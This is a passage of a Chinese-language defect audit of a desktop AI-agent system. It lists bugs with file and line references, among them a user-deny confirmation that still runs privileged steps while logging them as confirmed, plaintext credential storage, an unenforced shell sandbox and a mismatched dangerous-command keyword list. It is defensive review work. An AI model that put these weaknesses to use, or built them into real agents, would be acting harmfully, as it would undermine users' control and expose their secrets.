`group_3/app_agent.py:154-165`：`user_confirmed=False` 的分支同样执行 `self.escalated.append(info)`。前端（`index.html:479`）对 `escalations` 一律渲染为"🔑 提权流 步骤X 工具Y：USER 被拒 → **已确认** → ADMIN 重试"。→ **审计日志与界面都在说谎**：用户点了"仅执行免提权步骤"（deny），界面显示"已确认"。`escalated` 语义应是"实际发生的提权重试"。

**P1-17　"仅执行免提权步骤"只换 confirmer、不过滤计划**
`group_5/coordinator.py:115-137`：`confirm_mode == "deny"` 仅把 `agent.confirmer` 换成 `lambda info: False`，**plan.steps 一个都不删**。→ 提权步骤照常进入执行循环、照常产生副作用（GUI 动作无法"回滚"）、最后以"权限不足"失败，审计 verdict 判 **FAIL**。用户以为点了"安全模式"，实际是"全量执行 + 让提权步骤失败"。语义应为"过滤掉 `requires_admin` 步骤后再执行"。

**P1-18　`_verify_click` / `_resolve_refs` 的"上一步"语义不可靠**
- `group_3/app_agent.py:236-238`：`el2 == el` 用 **dict 相等**判断"是否同一个元素"，两次 `detect_elements()` 结果只要有一个字段波动就认为"新元素"→ 触发无谓重试。
- `group_3/app_agent.py:193-194`：`{{prev_result}}` 回填用 `ctx[max(ctx)]` = "**步骤号最大的成功步骤**"。若真正的上一步失败（不进 `ctx`），占位符会静默取到**更早的**结果 → 下游拿到张冠李戴的数据且无任何提示（例：`mcp_search` 失败 → `llm_answer(text="{{prev_result}}")` 拿到的是更早那步的 `organize` 结果）。正确语义应是"上一步若失败则显式置空/报错"。

**P1-19　计划步骤的失败/产物流向与注释不符（`last_file_target` 只在 skill 步更新）**
`group_2/task_planner.py:81-84`：只在 `steps[-1]["kind"] == "skill"` 时更新 `last_file_target`。→ "先 `write_file` 写报告，再 `backup` 打包"这条链里，`backup` 的 src 拿不到 `write_file` 的 path，仍落到顶层 target。注释写的"计划内最近文件步骤"实现不到位。

**P1-20　`control_detector` 的 Mock 元素违反自身输出契约**
`group_2/control_detector.py:167-175`：`_simulated_elements()` 返回的元素只有 `role/name/bbox` 三键（实测），缺 `app`、`depth`。而模块 docstring 与 SKILL 都声明契约是 `{"app","role","name","bbox","depth"}`。→ 前端控件树页渲染出 `undefined`（`index.html:892`）；更关键的是**本机后端实测就是 `mock`**（无 pyatspi/atspi-gi），意味着当前所有"控件树"演示数据都是这 4 条假元素，而 GUI 未做任何"这是 Mock 数据"的标记。

### 3.4 GUI 服务端

**P1-21　`/api/run` 分支重复定义两份，第二份永不可达 + 注释错位**
`gui/server.py:527-543` 与 `544-560` 是**逐字相同**的两个 `elif self.path.startswith("/api/run")` 分支（实测 `startswith("/api/run")` 出现 3 次：GET 1 次 + POST 2 次）。第二份是死代码。同时 `# /api/call：工具台以指定身份直接调用单个工具（真实闸门+统计）` 这条注释被挂在 `/api/chat_save` 分支上方（597 行），而真正的 `/api/call` 分支在 611 行 —— **注释与分支错位**，维护者按注释找分支必然改错地方。

**P1-22　`do_GET` 无异常兜底 → 参数异常直接断连**
`gui/server.py:301-394`：整个 `do_GET` 没有 try/except（POST 侧有 `except Exception` 兜底）。`/api/rag?k=abc` → `int("abc")` 抛 `ValueError`；`/api/run?cursor=abc` 同理 → 异常穿出 handler → **连接被直接关闭，客户端拿到的是空响应**而非 4xx/5xx JSON。前端 `catch` 后静默重试，表现为"统计/RAG 页偶发空白、点几次又好了"。GET/POST 错误处理不对称。

**P1-23　`/api/reset_stats` 是假清空**
`gui/server.py:689-693`：只 `os.remove(STATS_PATH)`，**不重置在跑的 `ToolStats` 实例的内存态**（`_records` 460 条、`_counters` 12 类仍在）。下一次任意工具调用触发 `record()` → `_save()` 把**全量历史账本写回文件**。→ 用户看到"已清空"→ 数字归零 → 下一次调用后又跳回 460。正确做法是 `stats.clear()`（该方法已存在，`src/stats.py:96-100`）。

**P1-24　凭据明文落盘 / 掩码泄露 / 注入环境变量**
- `gui/server.py:667-684`（`/api/llm_config`）：`host.apply_config()` 把 `api_key` **明文**写入 `system_out/llm_config.json`（实测该文件含 49 字符 `sk_` 开头明文 Key）。
- `gui/server.py:346`、`371`：`key[:4]+"****"+key[-4:]` / `key[:3]+"****"+key[-3:]` **泄露 8 位/6 位真实字符**给任意能访问 `/api/llm`、`/api/smtp_config` 的调用者（配合 P0-08 即任意本地网页可读）。
- `gui/server.py:158-169`（`load_smtp_config`）：import 时把 `SMTP_PASS`（实测 16 字符明文授权码）灌进 `os.environ` → **所有子进程（含 `run_command`、浏览器）都会继承该凭据**。
- `gui/server.py:569-590`（`/api/smtp_save`）明文写 `system_out/smtp_config.json`。
`.gitignore` 已排除 `system_out/`（好），但 SKILL.md 自述"打包必须排除整个目录"——工作副本里这几份文件**就在磁盘上**，任何 zip/拷贝/网盘分发都会带走。

**P1-25　`RUNS` 淘汰按 run_id 字典序而非插入顺序**
`gui/server.py:197-200`：`for old in sorted(RUNS)[:len(RUNS)-50]`。`run_id` 是随机 hex，`sorted()` 排的是**随机字符串序**，与时间无关。→ "只保留最近 50 次运行"实际是"随机保留 50 条非运行中的记录"，可能把刚完成的运行淘汰掉、把最老的留下。应改用 `dict` 插入序（Python 3.7+ 原生有序）或给 run 加单调序号。

---

## 4. P2 中危缺陷（46 条）

### 4.1 安全与工具（`src/`）

| ID | 位置 | 问题 |
|----|------|------|
| P2-01 | `src/default_tools.py:143-147` | `create_folder` **无受保护路径校验**（可 `mkdir -p /etc/xxx`），与 copy/move/write/delete 的口径不一致 |
| P2-02 | `src/default_tools.py:226-237` | `write_file` 不 `resolve()`、无 `..` 穿越防护、无大小上限、**非原子写**（中途失败留半截文件）；受保护路径只比对前缀 |
| P2-03 | `src/default_tools.py:244-283` | `run_command` 的 `shell=True` + 字符串拼接；`sandbox=True` 时仍由 shell 解析整串；无 bwrap 时"降级为直接执行"只在输出前缀写一句（**没有让调用方感知到沙箱未生效**） |
| P2-04 | `src/default_tools.py:41-45` | `SAFE_COMMANDS` 声明"informational，不强制白名单"，实际**零引用**（死常量），与"已弃用"的意图冲突 |
| P2-05 | `src/default_tools.py:150-198` | `list_directory` 的 `count` 语义是"扫描到的总条目数"，字段名易被误读为"返回条数"；`offset > count` 时静默返回空页无提示；`limit` 上限 1000 硬编码 |
| P2-06 | `src/real_tools.py:158,176-182` | `send_email` 里 `msg` **被完整构建两次**（第一次只为校验收件人，随即整对象丢弃）——注释已自认，属冗余实现；`sender` 在 `user` 被环境变量替换**之前**取值 |
| P2-07 | `src/real_tools.py:206-210` | `port = int(port or os.environ.get("SMTP_PORT", 465))` 无 ValueError 保护（直调时抛；经 registry 才被兜住） |
| P2-08 | `src/real_tools.py:108-119` | `_norm_recipients` 只要**一个**地址非法就整批返回 `[]`；错误信息回显**完整原始 `to`**（含全部合法地址）→ 与"隐私保护"目标相悖 |
| P2-09 | `src/real_tools.py:71-101` | `take_screenshot` 无隐私提示/无确认（USER 级即可调用），`path` 无受保护路径校验（可覆盖系统文件），固定 `time.sleep(2)` 阻塞调用线程 |
| P2-10 | `src/real_tools.py:43-64` | `open_url` 只校验 scheme 前缀，无域名白名单；`int(new)` 未做范围钳位 |
| P2-11 | `src/skill_library.py:59-83` | `call_skill` **重复定义两次**（第一次 def 在 59 行、第二次在 62 行）；实测生效实现起始行 = 62，第一份是死代码。功能侥幸正确（第二份覆盖第一份），但极易在后续编辑中被误改 |
| P2-12 | `src/skill_library.py:202-212` | `_organize_downloads` 只要有文件搬运失败（`errors` 非空）仍返回 `success=True`；`_cleanup_temp` 同理（`success=True` + `error_count`）→ 与"失败必须可见"红线冲突 |
| P2-13 | `src/skill_library.py:306-314` | `_cleanup_temp` 用 `f.unlink()` 直接删（**不经回收站、不备份**），只清理单层文件（`iterdir`），且对 `/home` 一类未保护目录可直接命中（叠加 P1-02） |
| P2-14 | `src/skill_library.py:377-426` | `_find_duplicate_files` 的 `suspects` 把同一 size 的**所有**文件都算 MD5（含只出现一次的同尺寸文件本不可能是嫌疑，但分组后按组取全部）；`by_size` 无文件数上限，百万文件时会话内存膨胀 |
| P2-15 | `src/skill_library.py:257-287` | `_find_files` 用 `rglob(pattern)`，用户传入 `**` 或绝对 pattern 时可越出 `directory`（`Path.rglob` 对绝对 pattern 行为未约束）；结果截断到 50 但不告知被截断 |
| P2-16 | `src/tool_registry.py:100-108` | 参数预检查只校验 `required` **是否存在**，不校验类型/枚举/数值范围（`copy_file(src=123)` 会进到实现层）；`type` 信息只在组2 防御，不在闸门 |
| P2-17 | `src/tool_registry.py:116-127` | 返回值规整里 `raw` 若为 `{"success": True}` 且无 `result`，`ToolResult.to_dict()` 仍会塞 `"result": None`；`raw["success"]` 为真值但类型非 bool 时静默 `bool()` 强转 |
| P2-18 | `src/stats.py:35-63` | **每次 `record()` 都全量重写整个 JSON**（O(n²) 磁盘 IO）；当前账本已 460 条，每笔调用重写全量。项目自带 `BufferedToolStats`（增量 + 环形 + 锁）却**零调用点** |
| P2-19 | `src/stats.py:59-60` | "每笔即落盘：进程崩溃最多丢当前一笔（原子写）"注释被放进了 `else:`（失败计数）分支体内（实测缩进确认）→ 语义错位，读代码者会误判落盘时机 |
| P2-20 | `src/stats.py:35-63` | `record()` 无锁；GUI 是 `ThreadingHTTPServer` 且 `/api/chat` 不占编排锁 → 并发调用时 `_records.append` 与 `_save()` 的 `NamedTemporaryFile` 存在竞态（`BufferedToolStats` 加了锁，未启用） |
| P2-21 | `src/mcp_connector.py:74-79` | `_real_search` 的去重判据 `title in [l.split(" ",1)[-1] for l in lines]` 恒不成立（`lines` 元素形如 `"• 标题\n  url"`）→ 去重失效，可能输出重复条目 |
| P2-22 | `src/mcp_connector.py:223-250` | `mock_jsonrpc_call` 判错误码用 `registry.has(name)`：工具存在但**权限不足**时会被误报为 `-32603 Internal error`（应为 `-32602 Invalid params` 或自定义码）；不校验顶层 `jsonrpc`/`id` 回带规范 |
| P2-23 | `src/mcp_connector.py:139-152` | `register_mock_tools` 每次调用都把 `mock-server` 的 `tools_count` 覆写回 3（幂等但会吞掉任何外部改动） |
| P2-24 | `src/web_automation.py:275-276` | `_cmd(self, method, params=None, _id: list[int] = [0])` —— **可变默认参数**在 `WebAutomation` 的所有实例间共享计数器（跨实例 id 串扰；本地影响小但是明确的 Python 反模式） |
| P2-25 | `src/web_automation.py:107-132` | `_WebSocket.recv_text` 的 pong 帧 `bytes([0x8A, len(chunk)])` 在 payload ≥126 字节时**长度编码非法**（只对 <126 正确）；`_WebSocket.__init__` 只校验状态码 101，**不校验 `Sec-WebSocket-Accept`** |
| P2-26 | `src/web_automation.py:183-193` | `_ensure_locked(url)` 的 `url` 形参**从未被使用**（实测）；`open_url` 传它只为形式对齐 |
| P2-27 | `src/web_automation.py:317-317` | `open_url` 的 `except CDPError: raise` 之后紧跟 `except Exception: pass` —— `Runtime.evaluate` 的失败被静默吞掉，`readyState` 轮询可能在页面未就绪时超时退出（结果不告知调用方"未等到 complete"） |
| P2-28 | `src/web_automation.py:688-694` | `register_web_tools` docstring 写"（幂等）"，实测**二次调用抛** `ValueError: 工具 'web_search' 已注册`；`register_real_tools`（`src/real_tools.py:254`）同样无幂等保护（实测二次调用抛 `ValueError: 工具 'open_url' 已注册`）→ 与 `mcp_connector` 的 `has()` 自检形成**三套幂等口径** |
| P2-29 | `src/interfaces.py:65-87` | `ToolSchema.to_dict()` 把 `default` 写进 `properties` 但**不写进 `required` 判定**；`ToolParamType` 未覆盖 `integer`（`days`/`limit` 等声明为 `NUMBER`，实际是整数语义）→ GUI 表单无法区分整数/浮点 |
| P2-30 | `src/batch_executor.py:235-262` | `BatchExecutor` 声称"高压批处理"，但 `_worker` 里 `self._results` 无上限（`drain` 才清零且 `drain` 不重置列表）；`shutdown()` 先 `put(None)` **再**由 worker `task_done`，若 `maxsize` 已满会**阻塞在 shutdown**；无生产调用点（未接线） |

### 4.2 组1/组2/组3

| ID | 位置 | 问题 |
|----|------|------|
| P2-31 | `group_1/host_agent.py:83-100` | `_match_goals` 对每条规则只 `re.search` **首个**命中 → "先整理 A 再整理 B"只产出一个 `organize` goal，第二个目标静默丢失 |
| P2-32 | `group_1/host_agent.py:347-353` | `_finalize_intent` 的"证据防线"用 `os.path.basename(r) not in user_input` 判断；当 `r` 以 `/` 结尾或为根时 basename 为空串，`"" in user_input` **恒真** → 防线失效 |
| P2-33 | `group_1/host_agent.py:481-499` | `detect_operation` 的保守门 `len(text) > 60 → None` 是硬编码魔数；只按 `goals` 数量 ≤2 判断，**不检查是否含 write_file/run_command**；`answer` 被显式排除（合理）但 `web_*` 未排除 |
| P2-34 | `group_1/host_agent.py:369-373` | 证据防线 `r.startswith(default_target.rstrip("/") + "/")` 在 Windows 下用 `/` 拼接而 `default_target` 含 `\` → 恒不匹配，防线在 Windows 完全失效 |
| P2-35 | `group_1/host_agent.py:614-664` | `_llm_intent` 用 `re.sub(r"^```(json)?|```$", "", content, flags=re.M)` 剥离代码栏 → 会把正文中**任意行首**的 ` ``` ` 也剥掉；解析失败无 schema 校验（`goals` 元素缺 `params` 时静默用 `{}`） |
| P2-36 | `group_1/host_agent.py:32-44` | `_CATEGORIES` 含 `click_element/web_*/answer` 等，但 `_RULES` 产出的动作集合与之不同步（历史累积）；`search` 已不再由 `_RULES` 产出，却仍保留映射 |
| P2-37 | `group_1/ai_shell.py:45-61` | `handle()` 在编排模式下 `print(f"[编排] 结果 {ok}/{len(...)}…")`，`ok` 统计用 `(r.get("tool_result") or {}).get("success", r.get("success", False))` —— GUI 步骤的 `tool_result` 有 `simulated` 标记，Shell 不显示，与"失败必须可见"不一致；`_show_history` 对 bundle 分支打印"…步"而非成败 |
| P2-38 | `group_2/task_planner.py:225-276` | `_gui_generic_steps` 的 `create_folder` 先 `open_app 文件管理器` 再发 `Ctrl+Shift+N`，但**不校验焦点**：若文件管理器未获得焦点（或已有别的窗口置顶），快捷键作用于错误窗口 |
| P2-39 | `group_2/task_planner.py:282-316` | `TaskPlanner._APP_DESKTOP` **没有 `zcode`**，而 `group_3/automator.Automator._APP_DESKTOP` **有 `zcode`**（automator 注释明确说"避免 zcode 被 code 抢走"）→ 两份应用路由表口径又不一致：planner 的 `_known_app_name("zcode")` 会匹配到 `code`→`vscode`？实测 `"code" in "zcode"` 为真且长度护栏 `len("zcode")=5 <= max(4,4)+1=5` 通过 → **"点击 zcode" 会被路由成启动 `code`** |
| P2-40 | `group_2/task_planner.py:331-338` | `_elements_for` 只收集内嵌 `params.element`；`element_query` 形式的元素不进 `elements{}`，与契约"elements: {引用的元素}"描述不符（执行期临时查询，行为可接受） |
| P2-41 | `group_2/task_planner.py:100-113` | `plan()` 里 `plan["routes"]` 只在 `group_2` 版本存在；根/`group_1` 副本产出**无 `routes` 字段**的 plan → 若下游按 `routes` 审计会 KeyError（当前因副本无导入点而未爆） |
| P2-42 | `group_2/route_policy.py:84-93` | `_required_ok` 在 `schemas` 为空时返回 `True` → 无 schema 环境下**无条件改写动作**，可能把 action 改成不存在的能力；`apply_route_policy` 因此依赖调用方必传 schemas，但签名给了默认 `None` |
| P2-43 | `group_2/route_policy.py:31-46` | `consumed_by` 对 `{{prev_result}}` 只关联**紧邻前一步**；若中间插入步骤（如 search → take_screenshot → write_file）则消费关系判错 |
| P2-44 | `group_2/route_policy.py:49-63` | `_refs_in` 的正则 `\{\{([^{}]+?)\}?\}` 对多层/嵌套括号（`{{a{{b}}c}}`）会截断/漏配；`_looks_like_url` 把 `1.5`、`a.b` 一类字符串判为"裸域名" |
| P2-45 | `group_2/control_detector.py:66-89` | `stack.append(self._child(obj, j))` 未做 `None` 保护：GI 在总线抖动时可能返回 `None`，后续 `_name(None)` 抛异常被逐节点 `except` 吞掉 → **静默丢枝**（与"失败必须可见"红线冲突的隐性形式） |
| P2-46 | `group_2/control_detector.py:45-120` | `find_element` 的每次 `retries` 重试都触发**全量** `detect_elements()`（8000 节点预算）；执行期 `element_query` 默认 `retries=3, interval=0.5`，规划期预定位再来一次 → 对 a11y 总线压力大，无缓存/无增量刷新（`refresh()` 是清空，不是失效重建） |
| P2-47 | `group_3/app_agent.py:202-217` | `_selfheal_name` 与 `try_call_with_selfheal`（`group_3/app_agent.py:207`）逻辑重复；后者**全项目无调用点**（死代码），且不递归、不记录失败原因 |
| P2-48 | `group_3/app_agent.py:113-142` | `_run_step` 里 GUI 元素的解析顺序是 `params.element` → `elements[target]` → `element_query`；`elements` 以**元素名**为键而 `target` 常是"应用名/口语名"，键不匹配时静默降级到查询（无提示） |
| P2-49 | `group_3/automator.py:56-84` | 未知 action 返回 `{"success": False, …, "simulated": not _REAL}`；在无 pyautogui 的 Linux 目标机上 `_REAL=False` → `simulated=False`，**用 simulated 字段表达"失败"**，语义混淆 |
| P2-50 | `group_3/automator.py:268-318` | `navigate` 在 `verified=False` 时 `os.makedirs(path, exist_ok=True)` —— 把"打开目录"扩展成"**创建**目录"（用户并没有要求创建），失败再静默 `pass` 后走 CLI 兜底 |
| P2-51 | `group_3/automator.py:330-334` | `capture_state()` 用进程 CWD 的 `os.listdir(".")` 当状态快照 —— 常驻服务进程的 CWD 与用户工作区无关，before/after 差值几乎无意义（`_verify_click` 的 window 判据才是有效信号） |
| P2-52 | `group_3/atspi_io.py:268-277` | `hotkey` 对不在 `_KEYCODE` 表里的键**静默丢弃**（`codes` 过滤后可能为空）→ `hotkey("f5")` 静默"成功"且什么都没按 |
| P2-53 | `group_3/atspi_io.py:279-285` | `type_text` 逐字符 keysym 合成，非 ASCII 直接 `_KSYM_SPECIAL.get(ch, ch)` 把**中文字符当 keysym** 传给 `generate_keyboard_event` → 静默无效（调用方在 `type_text` 分支注释里提到了，但本函数无兜底、无告警） |
| P2-54 | `group_3/atspi_io.py:206-223` | `window_names()` 只遍历 app 的直接子节点并硬截断 20 条 → `_verify_click` 的"窗口集合变化"判据在窗口多/嵌套 frame 时漏判 |
| P2-55 | `group_3/coord_check.py:26-32, 106-119` | `_TOL_PX=4` / `_TOL_SCALE=0.03` 在 HiDPI/缩放下会把"看起来有偏差"当"容差内"而不校正；`x_windows` 的 TTL 0.5s 全局变量 `_cache_ts/_cache_wins` 无锁（多线程下可能读到半更新） |
| P2-56 | `group_3/app_agent.py:23-37` | `FileManagerAgent.navigate_to/create_folder` 只发一条 `Ctrl+L` / `Ctrl+Shift+N` 快捷键，与类名/docstring 声称的"导航到路径/创建文件夹"语义不符（半成品），且**全项目无调用点** |

### 4.3 组5 与 GUI

| ID | 位置 | 问题 |
|----|------|------|
| P2-57 | `group_5/coordinator.py:51-113` | `plan_only()` 成功路径**既不 `_persist()` 也不 `audit()`**（只有 rejected / empty 两条路径落盘）→ 用户在确认面板点"取消"，本轮 intent/check/plan **零落盘、零审计**；两阶段流的最关键分支反而没有痕迹 |
| P2-58 | `group_5/coordinator.py:150-151` vs `257-258` | 两处 verdict 表达式不一致：`execute_approved` 是 `… else ("PASS" if total == 0 else "FAIL")`，`orchestrate` 是 `… else ("PASS" if total == 0 and not intent.get("goals") else "FAIL")`。**同一系统两套审计语义**；且 `execute_approved` 的"0 步执行 = PASS"让"什么都没跑"看起来像成功 |
| P2-59 | `group_5/coordinator.py:313-319` | `_consistent()` 只校验"组3 自报 summary == 组3 自己的 steps"（**自证**），不核对组4 `stats` 账本、不核对 `plan.steps` 条数 → "审计对账"没有独立证据源；技能步骤按契约不留 stats，天然对不上（`docs` 已承认，但这是设计而非 bug 的辩解不成立） |
| P2-60 | `group_5/coordinator.py:211-246` | 失败反思重试把 `bundle["intent"]/["plan"]/["session"]/["results"]` **覆盖为第二次结果**，首轮失败明细只剩 `reflected.fixed_goals` → 审计无法回看"第一次到底哪步失败、错误是什么" |
| P2-61 | `group_5/coordinator.py:289-298` | `_persist` 写 5 个固定文件名（无 run id、无时间戳、无历史）→ `main.py` 与 GUI 同时运行会互相覆盖；`system_out/last/` 副本的存在说明已有人手动做过区分，但代码没做 |
| P2-62 | `group_5/coordinator.py:70,184` | `security = self.security or SecuritySandboxStub()` **每次调用各新建一个 stub**；未注入 security 时静默放行（layer 0，reason 只写"仅测试环境"），但 `plan_only`/`orchestrate`/反思重试三处各自兜底，口径不一 |
| P2-63 | `group_5/rag.py:64-73` | `query()` 每次对**全量文档**重新 `_tokenize`（O(n) per query，无索引/缓存）；`_load()` 一次性把整个 JSONL 读进内存（现 225 条，长期累积会 OOM）；无文件锁、无大小上限 |
| P2-64 | `group_5/rag.py:91-96`, `group_5/coordinator.py:303-311` | `_append()` 与 `audit()` 的 open/write **无 try/except** → 磁盘满/权限问题时异常穿出，直接打断 `execute_approved`（对比 `_load` 与 stats 都做了容错，口径不一） |
| P2-65 | `gui/server.py:177-200, 373-389` | `_emit` 在 `RUNS_LOCK` **之外**追加 `run["events"]`，读端在锁内切片 → 可能读到半写状态（事件丢失/切片越界）；`RUNS.get(rid)` 也在锁外 |
| P2-66 | `gui/server.py:67-77, 640-641` | `SETTINGS_DEFAULT["rag_k"]` 是**死旋钮**：`/api/rag` 的 `k` 只取 query 参数（默认 3），设置项与 `apply_settings` 均未消费它 |
| P2-67 | `gui/server.py:137-147` | `apply_settings` 把持久化的 `workspace` 直接 `os.makedirs` → 本机 `system_out/settings.json` 现存 `/home/keyal/AIOS工作区`（Linux 路径），在 Windows 上会创建 `C:\home\keyal\AIOS工作区` 并把它当作默认工作区 → **跨平台移植时静默污染磁盘** |
| P2-68 | `gui/server.py:181-244` | `run["events"]` 无上限；`RUNS` 保留 50 次运行的**完整 bundle**（含 session/stats_detail/rag）→ 长会话内存持续增长；`PENDING` 无过期时间与容量上限（token 为 8 位 hex） |
| P2-69 | `gui/server.py:310-314` | `do_GET /api/controls` 在 `with _LOCK:` **内部**做全桌面 AT-SPI 遍历（8000 节点预算，实测可达数秒）→ 期间所有编排/工具调用被全局锁阻塞（"看控件树"会卡死整个系统） |
| P2-70 | `gui/server.py:291-298` | `_body()` 无 `Content-Length` 上限 → 超长请求体一次性读入内存（本地内存放大）；`Content-Length` 非数字时 `int()` 抛错（GET 侧无兜底、POST 侧被外层吃掉） |
| P2-71 | `gui/server.py:234-239` | `bundle["stats_detail"] = stats_payload()` 在 `with _LOCK` **之外**执行 → 与编排内工具调用写 stats 存在竞态（原子替换保证文件不损坏，但可能读到旧值） |
| P2-72 | `gui/server.py:240-242` | 编排线程异常只写 `run["error"]`，**不落 `audit_log.jsonl`** → 线程崩溃（如 `_persist`/`rag._append` 抛错）后审计日志无任何痕迹，"审计完整性"承诺落空 |
| P2-73 | `gui/index.html:419-449` | `pollRun` 里 `d.events.forEach(...)` 未防 `d` 为 404 错误体（`{error, rid, existing}`）→ `TypeError` 未被捕获，`setInterval` 每 800ms 抛一次，页面无提示 |
| P2-74 | `gui/index.html:603-607` | `CHAT.push({role:"assistant", content: sess.steps.filter(x=>x.name==="llm_answer").pop().tool_result.result.answer})` —— 若**最后一个** `llm_answer` 步骤没有 `answer`（前一步才有），push 进去的是 `undefined`，污染后续对话上下文 |
| P2-75 | `gui/index.html:529-539, 561-567` | `execOperation` 用 `card.dataset.text` 传递指令、`runStaged` 用局部 `staged.token`；而编排控制台用**全局 `PIPE_TOKEN`**（第 409 行声明位置在 `orchestrate()` 之后）→ 两条入口共用/混用确认状态，存在确认令牌串用风险 |
| P2-76 | `gui/index.html:753-757` | `renderForm` 只生成 `<input>`：schema 里 `ARRAY` 类型的参数（`send_email.to`、`send_email.attachment`）在工具台**只能输入一个字符串**，与"支持多附件"的能力不符；`data-t="boolean"` 用 `!(v.toLowerCase() in {"false":1,…})` 反查键存在性（可用但脆弱） |
| P2-77 | `gui/index.html:456-477` | `renderBundle` 里 `BUNDLE.session.steps` 无空值保护：删掉组3 步骤或会话为空时 `esc(st.name)` 等会抛错（`loadRun` 回看历史运行时触发） |
| P2-78 | `gui/index.html:432` | `pollRun` 内新建的 `escSteps` 变量**从未被使用**（真实渲染在 `renderBundle` 里另建一份）→ 每一步都重复计算一次 |

---

## 5. P3 低危 / 卫生问题（19 条）

| ID | 位置 | 问题 |
|----|------|------|
| P3-01 | `group_5/security.py:51-52` | `add_protected` 的 `return len(self.protected)` **之后**遗留 `self.signatures: dict[str,str] = {}`（不可达；且若可达会把签名表清空） |
| P3-02 | `group_5/security.py:97-100` | `register_signature` 对无源码对象（builtin、`exec` 出的函数、C 扩展）会抛 `OSError: could not get source code`，未捕获（实测复现） |
| P3-03 | `gui/server.py:247` | `SYSTEM = build_system() if False else SYSTEM` —— 重构残留的占位语句（`SYSTEM = build_system()` 在文件中出现 2 次） |
| P3-04 | `gui/server.py:597, 611` | `# /api/call：…` 注释挂在 `/api/chat_save` 分支上方（分支与注释错位） |
| P3-05 | `gui/server.py:26, 271` | 用 `ThreadingHTTPServer` 但未设 `protocol_version`（默认 HTTP/1.0）→ 每请求断连，`/api/chat` 的 SSE 流式语义在部分客户端/代理下不一致 |
| P3-06 | `gui/index.html:484-497` | `showPipeJson` **重复定义两次**（内容完全相同，第二份覆盖第一份） |
| P3-07 | `gui/index.html:361` | `_flowTo(n)` 定义后从未调用（死函数） |
| P3-08 | `gui/index.html:938` | `$("#page-settings")&&0;` 无意义占位语句 |
| P3-09 | `gui/index.html:63-79` | 缺 7 个 CSS 类定义：`.field` / `.tip` / `.req` / `.hl` / `.bar-row` / `.bar-track` / `.bar-fill`（实测全部未定义）→ 统计页"按接口聚合"条形图**完全不可见**（`.bar-fill` 无样式=0 高度）、提权步骤行 `.hl` 无高亮、设置/LLM 页 `.field` 无布局、`.tip/.req` 无样式。另 `<table class="toolbar">`（第 222 行）也未见定义 |
| P3-10 | `src/mcp_connector.py:73` | `# 逐条剥掉 HTML 标签并去重…` 注释被缩进到 `re.findall(...)` 调用内部（合法但异常），可读性差 |
| P3-11 | `src/skill_library.py:59-62` | 第一处 `call_skill` 定义只有一行 `params = params or {}`，是编辑事故的残留 |
| P3-12 | `src/web_automation.py:41-43` | `_BROWSER_CANDIDATES` 全为 Linux 路径，无 Windows/macOS 候选；`_PROFILE_DIR` 用 `Path.home()/".local/share/agent_os"` 硬编码 Linux 布局 → 与"可移植"自述冲突 |
| P3-13 | `group_1/__init__.py` vs `group_3/4/5/__init__.py` | 后三者导入时 `sys.path.insert(0, _ROOT)`（包导入即改全局搜索路径的副作用），`group_1` 不做 → `group_1.host_agent` 依赖 `from src import llm_client`，**任意 cwd 下 `import group_1` 会失败**（依赖调用方先放好 ROOT），口径不一致 |
| P3-14 | `src/__init__.py` | 同时存在 `src`（组4 真实实现）与 `group_4`（再导出）两个组4 入口，`main.py` 用 `group_4`、测试直接用 `src` → 双入口 |
| P3-15 | `main.py:43-51` | `DEMO_SCENARIOS` 注释与内容不符（"任务书原路径 /home/user/Documents"→ 实际用 `/tmp`），场景编号缺"场景4" |
| P3-16 | `main.py:54-67` | `prepare_sandbox()` 每次 `shutil.rmtree(sandbox)` 后重建 → 跑 `--demo` 会**销毁上次演示数据**且无备份（与本项目"备份"卖点形成讽刺对照） |
| P3-17 | 项目根 `hnu_intro.md`（167 B） | 内容是 Python `repr` 形式的工具结果（`{'question': '总结当前页面的主要内容', 'answer': '…'}`），是误落盘的临时产物；同类还有根 `demo_task_backup.zip`(1231 B)、`out/`（截图/文档/天气），`out/天气_md` 文件名明显异常（应为 `天气.md`，后缀被写成 `_md`） |
| P3-18 | `tests/` | 残留 **48 个** `.tmp_out_*` / `.tmp_demo_*` 目录（约 0.41 MB），`IntegrationBase.setUp` 用 `id(self)` 命名 + tearDown 异常时的堆积产物（`.gitignore` 已排除，但工作树脏） |
| P3-19 | `tests/test_integration_v10.py:706-718` | `test_full_scenario_table_passes` 依赖真实 LLM 在环并"失败重试一次" → 测试非确定性；`TestWebCDPIntegration` 会真开浏览器；`test_web_tools_mock_degrade` 断言"Mock 也算 success"（把 P0-10 固化为契约） |

---

## 6. 架构与一致性专题（跨文件）

### 6.1 重复实现清单（全部零导入点，随时误导）

| 文件 | 状态 | 与在用实现的差异 |
|------|------|------------------|
| `task_planner.py`（根） | **与 `group_1/task_planner.py` 字节相同**（sha256 `b1a6976b…`） | 无 `route_policy`、无 `click_element`、`create_folder` 为三步快捷键、无 `last_file_target`；对比在用 `group_2/task_planner.py`（`5f9c881e…`）已完全落后 |
| `group_1/task_planner.py` | 同上（死文件） | 同上 |
| `host_agent.py`（根，403 行） | 死文件（`ad79bd61…`） | 无 `_finalize_intent`/`repair_intent`/`detect_operation`/web 动作/目标位置排序 → **"红线 3 确定性归一"的全部修复都不在其中** |
| `group_3/FileManagerAgent` | 半成品，无调用点 | 只发快捷键，不实现导航/创建 |
| `group_3/AppAgent.try_call_with_selfheal` | 死代码 | 与 `_call_contract` 自愈流重复 |
| `gui/index.html::showPipeJson` | 重复定义 ×2 | 完全相同的两份 |
| `src/skill_library.py::call_skill` | 重复定义 ×2 | 第一份被覆盖（死代码） |
| `group_5/SecuritySandbox.redact` | 零调用点 | docstring 声称的第 4 层从未生效 |
| `group_5/SecuritySandbox.register_signature` | 零调用点 | 第 3 层从未生效 |
| `src/stats_buffered.BufferedToolStats` | 零调用点 | 增量+环形+锁的实现未被主链路采用（主链路仍用每次全量重写的 `ToolStats`） |
| `src/batch_executor.BatchExecutor` | 零调用点 | "高压批处理"未接线 |
| `src/mock_registry.py` / `src/mock_skills.py` | 零调用点（任务书要求保留，合理） | — |
| `src/default_tools.SAFE_COMMANDS` | 零引用 | 死常量 |

### 6.2 黑名单 / 路径保护的口径分裂（三处独立定义）

| 项 | `src/default_tools.py` | `group_5/security.py` | 差异 |
|----|----------------------|---------------------|------|
| 危险命令关键词 | 21 个（含 `chmod -r 777`） | 20 个（缺 `chmod -r 777`） | 不一致 |
| 受保护路径 | Linux 9 + Windows 3 | 仅 Linux 9 | 不一致 |
| 匹配方式 | 完整路径 `== / startswith(pp + "/")`（`_is_protected_path`） | **子串 + 边界正则**，且会扫 `user_text`（`_protected`） | 语义不同（后者误拦话语） |
